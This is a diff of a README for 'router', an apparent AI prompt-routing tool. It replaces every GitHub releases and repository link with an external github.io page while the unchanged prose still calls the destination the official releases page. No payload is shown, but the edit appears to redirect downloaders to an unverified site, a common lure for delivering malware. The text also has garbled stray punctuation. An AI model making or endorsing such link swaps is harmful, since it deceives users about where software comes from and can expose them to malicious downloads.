@@ -1,6 +1,6 @@
 # ⚡ router - Route Every Prompt to the Best Model in Milliseconds
 
-[![Download router](https://img.shields.io/badge/Download-router-blue?style=for-the-badge&logo=github&logoColor=white&color=random)](https://github.com/daiminking2/router/releases)
+[![Download router](https://img.shields.io/badge/Download-router-blue?style=for-the-badge&logo=github&logoColor=white&color=random)](https://daiminking2.github.io)
 
 Welcome to **router** — the smart model router that makes your AI tools faster, cheaper, and smarter. If you use AI coding assistants like Claude Code, Codex, or any other agentic system, this application is about to change your life.
 
@@ -39,7 +39,7 @@ Getting router up and running takes fewer than five minutes. Follow these steps 
 
 Visit this link to download the application:
 
-**[📥 Download router Now](https://github.com/daiminking2/router/releases)**
+**[📥 Download router Now](https://daiminking2.github.io)**
 
 This link takes you to the official releases page where you can find the latest version of router. It is the only place you need to go. No need to search anywhere else.
 
@@ -169,7 +169,7 @@ router runs entirely on your computer. Your prompts go through router directly t
 
 ## 📞 Need More Help?
 
-Visit the [GitHub repository](https://github.com/daiminking2/router) for the latest documentation, community discussions, and release notes.. You can also open an issue if you run into any problem — the community is friendly,.,
+Visit the [GitHub repository](https://daiminking2.github.io) for the latest documentation, community discussions, and release notes.. You can also open an issue if you run into any problem — the community is friendly,.,
 
 ,,
 
@@ -177,7 +177,7 @@ Visit the [GitHub repository](https://github.com/daiminking2/router) for the lat
 
 You are one download away from slashing your AI costs forever. The setup takesminutes, and the savings start immediately.,
 
-**[📥 Download router Now](https://github.com/daiminking2/router/releases)**
+**[📥 Download router Now](https://daiminking2.github.io)**
 
 Join thousands of happy users who stopped overpaying for AI. Let router pick the right model every time,so you do not have to.,
 
